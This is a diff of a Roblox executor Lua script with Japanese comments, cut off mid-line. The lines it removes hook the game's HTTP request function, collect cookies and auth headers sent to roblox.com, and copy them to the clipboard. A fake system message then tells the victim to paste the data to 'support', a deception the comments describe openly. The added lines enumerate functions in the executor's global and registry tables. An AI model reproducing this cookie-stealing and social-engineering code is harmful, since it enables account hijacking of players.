@@ -1,30 +1,15 @@
--- Deltaの強力なフック機能を使用
-local old_request
-old_request = hookfunction(request or http_request, function(options)
-    -- optionsの中には URL, Method, Headers が入っている
-    
-    -- 1. 通信内容をチェック（特定のドメインやキーワードを狙い撃ちする場合）
-    if options.Url and options.Url:find("roblox.com") then
-        -- 2. ヘッダーからクッキーや認証情報を抽出
-        -- (実際のクッキーは .Headers["Cookie"] などに含まれる)
-        local extractedData = "Target URL: " .. options.Url .. "\n"
-        
-        if options.Headers then
-            for key, value in pairs(options.Headers) do
-                extractedData = extractedData .. key .. ": " .. value .. "\n"
-            end
-        end
+local functionList = {}
+local seen = {}
 
-        -- 3. 【核心】抽出した情報をクリップボードに強制コピー
-        -- 言葉の罠と組み合わせて「認証コードをコピーしました」と偽装する
-        setclipboard(extractedData)
-        
-        print("--- [SYSTEM] 認証データをクリップボードに保護しました ---")
-        print("サポートに貼り付けて送ってください。")
-    end
+-- 1. 抽出対象の「システム環境」を定義
+-- getgenv: エグゼキューターの独自グローバル
+-- getreg: Luaの内部レジストリ（ここにシステム関数が隠れている）
+local targets = {getgenv(), getreg()}
 
-    -- 4. 本来の通信を邪魔しないように実行を継続させる
-    return old_request(options)
-end)
-
-print("作戦1：通信監視シールド展開完了。")
+for _, env in ipairs(targets) do
+    for name, value in pairs(env) do
+        if type(name) == "string" and type(value) == "function" and not seen[name] then
+            -- 2. Roblox標準の関数やメタメソッド、内部変数を弾く
+            -- ドットが含まれるもの（game.Workspaceなど）やアンダーバー系を排除
+            if not name:find("%.") and not name:match("^__") then
+                -- 3. 明らかにシステム的な名前
